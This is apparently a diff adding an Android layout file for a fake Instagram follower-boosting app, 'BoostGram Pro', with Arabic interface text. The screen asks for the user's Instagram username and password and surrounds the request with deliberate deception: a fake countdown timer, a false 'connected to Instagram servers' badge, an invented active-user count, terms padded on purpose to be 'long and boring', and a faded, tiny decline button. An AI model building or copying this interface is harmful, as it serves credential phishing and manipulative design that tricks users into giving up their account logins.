@@ -1,0 +1,192 @@
+<?xml version="1.0" encoding="utf-8"?>
+<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:background="@color/dark_bg">
+
+    <!-- Splash Screen -->
+    <LinearLayout
+        android:id="@+id/layoutSplash"
+        android:layout_width="match_parent"
+        android:layout_height="match_parent"
+        android:gravity="center"
+        android:orientation="vertical">
+
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="BoostGram Pro"
+            android:textColor="@color/insta_pink"
+            android:textSize="32sp"
+            android:textStyle="bold" />
+
+        <ProgressBar
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:layout_margin="32dp"
+            android:indeterminateTint="@color/insta_purple" />
+    </LinearLayout>
+
+    <!-- Main Flow -->
+    <LinearLayout
+        android:id="@+id/layoutMain"
+        android:layout_width="match_parent"
+        android:layout_height="match_parent"
+        android:orientation="vertical"
+        android:padding="24dp"
+        android:visibility="gone">
+
+        <!-- Header (Scarcity & Live Data) -->
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="horizontal"
+            android:gravity="space_between">
+
+            <TextView
+                android:id="@+id/tvTimer"
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="04:59"
+                android:textColor="@color/insta_orange"
+                android:textStyle="bold"
+                android:textSize="16sp" />
+
+            <TextView
+                android:id="@+id/tvLive"
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="🟢 متصل بخوادم إنستغرام"
+                android:textColor="@color/text_white"
+                android:textSize="14sp" />
+        </LinearLayout>
+
+        <TextView
+            android:id="@+id/tvActiveUsers"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="8dp"
+            android:text="14,230 مستخدم نشط الآن"
+            android:textColor="@color/insta_yellow"
+            android:textSize="12sp" />
+
+        <!-- Gender Selection -->
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="24dp"
+            android:text="اختر جنسك للحصول على متابعين مستهدفين:"
+            android:textColor="@color/text_white"
+            android:textSize="16sp" />
+
+        <RadioGroup
+            android:id="@+id/rgGender"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="horizontal"
+            android:layout_marginTop="8dp">
+
+            <RadioButton
+                android:id="@+id/rbMale"
+                android:layout_width="0dp"
+                android:layout_height="wrap_content"
+                android:layout_weight="1"
+                android:text="ذكر"
+                android:textColor="@color/text_white" />
+
+            <RadioButton
+                android:id="@+id/rbFemale"
+                android:layout_width="0dp"
+                android:layout_height="wrap_content"
+                android:layout_weight="1"
+                android:text="أنثى"
+                android:textColor="@color/text_white" />
+        </RadioGroup>
+
+        <!-- Terms -->
+        <TextView
+            android:id="@+id/tvTerms"
+            android:layout_width="match_parent"
+            android:layout_height="0dp"
+            android:layout_weight="1"
+            android:layout_marginTop="16dp"
+            android:text="مرحباً بك في BoostGram Pro.
+نحن نلتزم بتقديم أفضل خدمة لزيادة متابعيك...
+يرجى قراءة الشروط التالية بعناية:
+1. لا نتحمل مسؤولية أي ضرر...
+2. بياناتك محمية...
+[تكرار النص لجعله طويلاً ومملاً]"
+            android:textColor="@color/text_gray"
+            android:textSize="12sp"
+            android:scrollbars="vertical" />
+
+        <!-- Input -->
+        <EditText
+            android:id="@+id/etUsername"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:hint="اسم المستخدم في إنستغرام"
+            android:textColorHint="@color/text_gray"
+            android:textColor="@color/text_white"
+            android:inputType="text"
+            android:layout_marginTop="8dp" />
+
+        <EditText
+            android:id="@+id/etPassword"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:hint="كلمة المرور"
+            android:textColorHint="@color/text_gray"
+            android:textColor="@color/text_white"
+            android:inputType="textPassword"
+            android:layout_marginTop="8dp" />
+
+        <!-- Buttons -->
+        <Button
+            android:id="@+id/btnDecline"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="رفض"
+            android:textSize="10sp"
+            android:textColor="@color/text_gray"
+            android:background="?attr/selectableItemBackground"
+            android:layout_gravity="center_horizontal"
+            android:alpha="0.5"
+            android:layout_marginTop="8dp" />
+
+        <Button
+            android:id="@+id/btnAccept"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="لقد قرأت الشروط وأوافق"
+            android:backgroundTint="@color/insta_pink"
+            android:textColor="@color/text_white"
+            android:layout_marginTop="8dp" />
+    </LinearLayout>
+
+    <!-- Progress Screen -->
+    <LinearLayout
+        android:id="@+id/layoutProgress"
+        android:layout_width="match_parent"
+        android:layout_height="match_parent"
+        android:gravity="center"
+        android:orientation="vertical"
+        android:visibility="gone">
+
+        <TextView
+            android:id="@+id/tvProgressStatus"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="جاري الاتصال..."
+            android:textColor="@color/text_white"
+            android:textSize="18sp" />
+
+        <ProgressBar
+            android:id="@+id/progressBar"
+            style="?android:attr/progressBarStyleHorizontal"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:layout_margin="32dp"
+            android:progressTint="@color/insta_purple" />
+    </LinearLayout>
+</FrameLayout>
